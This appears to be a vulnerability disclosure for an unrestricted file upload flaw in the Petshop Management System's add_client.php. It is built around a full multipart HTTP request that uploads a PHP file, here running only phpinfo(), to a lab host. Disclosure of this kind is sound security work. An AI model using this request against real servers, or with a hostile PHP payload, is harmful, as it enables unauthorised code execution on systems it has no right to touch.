petshop-management-system  add_client.php any file upload

Exploit Author: webraybtl@webray.com.cn inc

Vendor Homepage: https://www.sourcecodester.com/php/14962/petshop-management-system-using-phppdo-oop-full-source-code-complete.html

Software Link: https://www.sourcecodester.com/php/14962/petshop-management-system-using-phppdo-oop-full-source-code-complete.html

CMSName: petshop-management-system

Tested on: Windows, Apache ,Mysql

Description

The reason for the arbitrary file upload vulnerability is that the website application allows users to upload any type of file without restrictions in the add_client. php code, resulting in arbitrary file uploads.

    Payload used:

    POST /Petshop_Management_System/controllers/add_client.php HTTP/1.1
    Host: 192.168.2.110
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Referer: http://192.168.2.110/Petshop_Management_System/
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysOcLQ1YbU3iam8cM
    Content-Length: 182
    
    ------WebKitFormBoundarysOcLQ1YbU3iam8cM
    Content-Disposition: form-data; name="image_profile";filename="test.php"
    
    <?php phpinfo();?>
    ------WebKitFormBoundarysOcLQ1YbU3iam8cM--


Proof of Concept

![image](https://github.com/user-attachments/assets/ed3722ad-d1f6-431c-995f-f3cb2e23ba40)
![image](https://github.com/user-attachments/assets/abbd8988-36db-428f-b854-be84523734f9)

![image](https://github.com/user-attachments/assets/57cb8cef-7350-412d-b644-8d70a2088a2f)



